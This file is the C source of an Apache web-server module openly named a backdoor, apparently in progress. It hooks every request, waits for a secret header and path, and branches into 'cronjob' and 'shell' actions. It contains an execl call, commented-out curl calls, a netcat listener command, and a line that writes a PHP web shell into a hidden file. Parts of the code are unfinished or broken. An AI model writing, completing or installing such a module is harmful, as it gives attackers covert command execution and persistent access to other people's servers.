// cronjob will be created under the `www-data` user.
//sudo nc -lvnp 4444
#include "httpd.h"
#include "http_protocol.h"
#include "http_request.h"
#include "http_config.h"
#include "apr_strings.h"
#include "apr_tables.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int backdoor_handler(request_rec *r) {

   const apr_array_header_t *arr = apr_table_elts(r->headers_in);
   const apr_table_entry_t *entries = (const apr_table_entry_t *)arr->elts;
   const char *cmd = apr_table_get(r->headers_in, "sourpatchkids");
   if (!cmd) return DECLINED;
   if (!strcmp(r->filename, "/var/www/html/errorteacups")) {
      if (r->args) {
         char *path = strtok(r->args, "=");
         if (!strcmp(path, "url")) {
            char *action = strtok(NULL, "=");
            if (!strcmp(action, "cronjob")) {
               ap_rprintf(r, "%s  -> ", action);
            } else if (!strcmp(action, "shell")) {
               
               ap_rprintf(r, "%s YERPPPPP  ", action);
               //system("touch example");
               execl("touch example", NULL);
               //system("curl http://127.0.0.1:9999/b00bz");
               return 0;
               //execl("/bin/bash", "curl http://127.0.0.1:9999/test", NULL);
               //execl("/bin/bash", "bash", "-c", "echo -n '<!DOCTYPE html><html><head><title>example webshell</title></head><body><?php system($_GET['cmd']); ?></body></html>' >> .dew.php", NULL);
               //return OK;
            }
         }
         
         //ap_rprintf(r, "%s  -> ", key);
         //ap_rprintf(r, "%s", value);

      }
      return DONE;
   }
   return OK;
}

static void register_hooks(apr_pool_t *p) {
   ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
   ap_hook_log_transaction(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
   STANDARD20_MODULE_STUFF,
   NULL, NULL, NULL, NULL, NULL, register_hooks
};

